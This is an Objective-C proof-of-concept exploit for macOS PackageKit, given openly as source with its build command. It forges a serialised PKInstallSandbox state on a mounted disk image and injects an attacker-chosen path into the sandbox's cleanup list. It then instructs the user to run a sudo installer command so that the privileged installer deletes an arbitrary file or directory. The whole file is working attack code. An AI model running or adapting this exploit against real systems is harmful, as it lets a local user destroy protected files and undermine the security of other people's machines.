// clang exploit.m -o /tmp/exploit -framework Foundation -fobjc-arc -fobjc-link-runtime /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX.sdk/System/Library/PrivateFrameworks/PackageKit.framework/Versions/A/PackageKit.tbd

#import <Foundation/Foundation.h>
#include <sys/stat.h>

@interface PKInstallRequest : NSObject <NSSecureCoding>
+ (id)requestWithPackages:(id)arg1 destination:(id)arg2;
@end

@interface PKPackageSpecifier : NSObject <NSSecureCoding, NSCopying>
- (id)_initWithDictionaryRepresentation:(id)arg1;
- (id)_dictionaryRepresentation;
@end


@interface PKInstallSandbox : NSObject <NSSecureCoding>
{
@public
    NSString *_sandboxPath;
    PKInstallRequest *_installRequest;
    NSString *_scriptsPath;
    NSString *_temporaryPath;
    NSNumber *_stagedSize;
    NSDate *_stageDate;
    NSMutableDictionary *_scriptDirsByPackageSpecifier;
    NSMutableDictionary *_bomPathsByPackageSpecifier;
    NSMutableArray *_cleanupPaths;
    NSDictionary *_scriptsAttributes;
    NSDictionary *_temporaryAttributes;
    NSSet *_previousPackageIdentifiersSharingGroupsWithSandbox;
    long long _relevance;
    BOOL _safeToReset;
}

- (id)initWithSandboxPath:(id)arg1 installRequest:(id)arg2 error:(id *)arg3;
@end

#define MOUNT_DIR "/tmp/.exploit"
#define SBX_REPO_DIR MOUNT_DIR"/.PKInstallSandboxManager-SystemSoftware"
#define SBX_DIR SBX_REPO_DIR"/exploit.sandbox"
#define SBX_STATE_PATH SBX_DIR"/SandboxState"

void prepare(const char *pathToClean) {
    printf("preparing...\n");
    
    mkdir(MOUNT_DIR, 0777);
    system("hdiutil create -size 10m -volname .exploit -ov disk.dmg");
    system("hdiutil attach disk.dmg -mountpoint "MOUNT_DIR);
    mkdir(SBX_REPO_DIR, 0777);
    mkdir(SBX_DIR, 0777);
    
    PKPackageSpecifier *pkg_spec = [[PKPackageSpecifier alloc] _initWithDictionaryRepresentation:@{@"URL":@"file://localhost/tmp/PagesEndNote.pkg#PagesEndNote.pkg", @"identifier":@"PENP", @"version":@"4.2.1.1628343686", @"displayName":@"Pages EndNote Plug-in", @"displayVersion":@"", @"authLevel":@2, @"options":@16}];
    PKInstallRequest *req = [PKInstallRequest requestWithPackages:@[pkg_spec] destination:@MOUNT_DIR]; // -[PKInstallRequest _isDeeplyEqualToRequest:]

    PKInstallSandbox *installSandbox = [[PKInstallSandbox alloc] initWithSandboxPath:@SBX_DIR installRequest:req error:nil];
    installSandbox->_cleanupPaths = [NSMutableArray arrayWithObjects:[NSString stringWithUTF8String:pathToClean], nil];
    
    id data = [NSKeyedArchiver archivedDataWithRootObject:installSandbox requiringSecureCoding:TRUE error:nil];
    [data writeToFile:@SBX_STATE_PATH atomically:TRUE];
    NSLog(@"Serialize sandbox:%@ to file:%@", installSandbox, @SBX_STATE_PATH);
    
//    id unarch = [[NSKeyedUnarchiver alloc] initForReadingFromData:data error:nil];
//    [unarch setDecodingFailurePolicy:0];
//    installSandbox = [unarch decodeObjectOfClass:[PKInstallSandbox class] forKey:NSKeyedArchiveRootObjectKey];
//    [unarch finishDecoding];
//    req = installSandbox->_installRequest;
//    NSLog(@"req:%@, pkg_spec:%@", req, [req->_packageSpecifiers[0] _dictionaryRepresentation]);
}


int main(int argc, const char * argv[]) {
    if (argc != 2) {
        printf("Usage: %s /path/to/arbitray_file_or_directory\n", argv[0]);
        return -1;
    }
    
    prepare(argv[1]);
    printf("All done. Now run the command `sudo installer -pkg /tmp/PagesEndNote.pkg -target /tmp/.exploit`\n");
    
    return 0;
}
